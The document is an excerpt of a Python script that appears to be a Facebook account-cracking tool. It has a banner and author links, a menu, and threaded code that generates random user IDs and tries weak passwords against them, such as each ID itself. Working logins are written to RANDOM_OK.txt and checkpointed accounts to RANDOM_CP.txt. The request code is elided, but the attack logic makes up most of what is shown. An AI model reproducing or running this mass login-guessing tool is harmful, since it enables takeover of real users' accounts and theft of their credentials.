...
###-------[LOGO]-----------####
logo= f'''\033[1;97m
\033[1;31m       ________  _ ____  _      _  _     
/  __/\  \///  _ \/ \__/|/ \/ \  /|
|  \   \  / | / \|| |\/||| || |\ ||
|  /_  / /  | |-||| |  ||| || | \||
\____\/_/   \_/ \|\_/  \|\_/\_/  \|\033[1;31m
                                                                    
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : ADNAN EYAMIN 
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/mdminhajahmend
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/EYAMIN107/EYAMIN
...
def menu():
    ...
    if younisxyz in ['1','01']:
        ...
        os.system("xdg-open https://www.facebook.com/mdminhajahmend?mibextid=ZbWKwL")
        time.sleep(3)
        menu()
...
def random_number():
    ...
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        ...
        for xyz in idz:
            uid = code+xyz
            pww = [eyamin,uid] 
            EYAMIN.submit(crack, uid, pww, total_idz)
    linex()
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[Eyamin] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [EYAMIN-OK] {uid} | {pw}")
                open("/sdcard/EYAMIN/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in po["error"]["message"]:
                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
                print(f"\r{cpclr} [EYAMIN-CP] {uid} | {pw}")
                open("/sdcard/EYAMIN/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
